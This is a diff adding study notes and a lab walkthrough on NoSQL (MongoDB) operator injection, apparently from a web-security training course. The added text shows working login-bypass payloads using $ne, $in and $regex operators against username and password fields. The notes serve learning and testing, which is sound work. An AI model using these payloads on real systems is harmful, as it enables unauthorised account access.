@@ -56,9 +56,53 @@ If this causes a change from the original response, this may indicate that user 
 
 
 
+NoSQL operator injection
+------------------------
+
+NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:
+
+-   `$where` - Matches documents that satisfy a JavaScript expression.
+-   `$ne` - Matches all values that are not equal to a specified value.
+-   `$in` - Matches all of the values specified in an array.
+-   `$regex` - Selects documents where values match a specified regular expression.
+
+You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.
+
+### Submitting query operators
+
+In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
+
+For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:
+
+1.  Convert the request method from `GET` to `POST`.
+2.  Change the `Content-Type` header to `application/json`.
+3.  Add JSON to the message body.
+4.  Inject query operators in the JSON.
 
 
 
+
+### Detecting operator injection in MongoDB
+
+Consider a vulnerable application that accepts a username and password in the body of a `POST` request:
+
+`{"username":"wiener","password":"peter"}`
+
+Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:
+
+`{"username":{"$ne":"invalid"},"password":"peter"}`
+
+If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.
+
+If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:
+
+`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
+
+This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.
+
+To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:
+
+`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
 
 
 
@@ -138,8 +182,47 @@ https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?categor
 
 
 
+<details>
+  <summary>Lab: Exploiting NoSQL operator injection to bypass authentication</summary>
 
 
+1. try to inject in username feild
+
+<img width="1495" height="512" alt="image" src="https://github.com/user-attachments/assets/70d67729-c870-48ae-bd61-110e8a8efeca" />
+
+```json
+"username":{"$ne":""},
+"password":"peter"}
+```
+
+2. see if also the password is vuln
+
+<img width="1451" height="535" alt="image" src="https://github.com/user-attachments/assets/02657c16-73e1-43f8-a285-4ccc78d85c7a" />
+
+```json
+{
+  "username":{"$ne":""},
+  "password":{"$ne":""}
+}
+```
+
+3. now try to login with account that start with **`admin`**
+
+<img width="1420" height="567" alt="image" src="https://github.com/user-attachments/assets/45966e56-20c8-4226-b497-d1f7034686f0" />
+
+```json
+{
+  "username":{"$regex":"admin.*"},
+  "password":{"$ne":""}
+}
+```
+
+
+<img width="1284" height="643" alt="image" src="https://github.com/user-attachments/assets/7816e4bf-9570-4247-b314-6ef68e4f4a5d" />
+
+
+  
+</details>
 
 
 
